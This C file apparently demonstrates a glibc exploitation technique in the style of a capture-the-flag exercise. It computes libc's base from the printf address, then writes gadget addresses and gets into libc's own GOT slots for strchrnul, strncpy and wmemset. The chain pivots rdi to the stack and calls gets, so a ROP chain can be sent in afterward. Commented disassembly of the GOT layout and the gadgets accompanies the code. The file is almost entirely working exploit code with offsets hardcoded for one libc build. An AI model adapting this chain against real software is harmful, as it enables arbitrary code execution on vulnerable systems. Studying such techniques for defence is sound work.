#include <stdio.h>
#include <unistd.h>
#include <string.h>

// .got.plt:00000000001FE078 off_1FE078      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
// .got.plt:00000000001FE080 off_1FE080      dq offset strlen        ; DATA XREF: j_strlen+4↑r
// .got.plt:00000000001FE088 off_1FE088      dq offset wcscat        ; DATA XREF: j_wcscat+4↑r
// .got.plt:00000000001FE090 off_1FE090      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
// .got.plt:00000000001FE098 off_1FE098      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
// .got.plt:00000000001FE0A0 off_1FE0A0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
// .got.plt:00000000001FE0A8 off_1FE0A8      dq offset _dl_deallocate_tls
// .got.plt:00000000001FE0B0 off_1FE0B0      dq offset __tls_get_addr
// .got.plt:00000000001FE0B8 off_1FE0B8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r
// .got.plt:00000000001FE0C0 off_1FE0C0      dq offset memcmp        ; DATA XREF: j_memcmp+4↑r
// .got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r

// # overwrite strchrnul.got with:
// .text:0000000000177ED9 loc_177ED9:                             ; CODE XREF: login+123↓j
// .text:0000000000177ED9                 lea     rdi, [rsp+18h]
// .text:0000000000177EDE                 mov     edx, 20h ; ' '
// .text:0000000000177EE3                 call    j_strncpy
// # overwrite strncpy.got with:
// .text:00000000000D6128                 pop     rbx
// .text:00000000000D6129                 pop     rbp
// .text:00000000000D612A                 pop     r12
// .text:00000000000D612C                 pop     r13
// .text:00000000000D612E                 jmp     j_wmemset_0

// # overwrite wmemset.got with `gets`

int main() {
    char *addr = 0;
    size_t len = 0;
    printf("printf %p\n", printf);
    char* libc=printf-0x5c7c0;
    char* libc_got=libc+0x00000000001FE000;
    printf("libc got %p\n",libc_got);
    char* change_rdi_rsp_call_strncpy_gadget=libc+0x0000000000177ED9;
    char* pop_change_rsp_jmp_wmemset_0_gadget=libc+0x00000000000D6128;
    char* gets=libc+0x82b60;
    *(unsigned long long *)(libc_got+0x78)=pop_change_rsp_jmp_wmemset_0_gadget;   //  j_strncpy 
    *(unsigned long long *)(libc_got+0xb8)=gets;   //  j_wmemset_0 
    *(unsigned long long *)(libc_got+0xc8)=change_rdi_rsp_call_strncpy_gadget;  // j_strchrnul  change rdi to rsp
    printf("llk");
    // 最后会调用gets然后起个python脚本交互写rop链
}

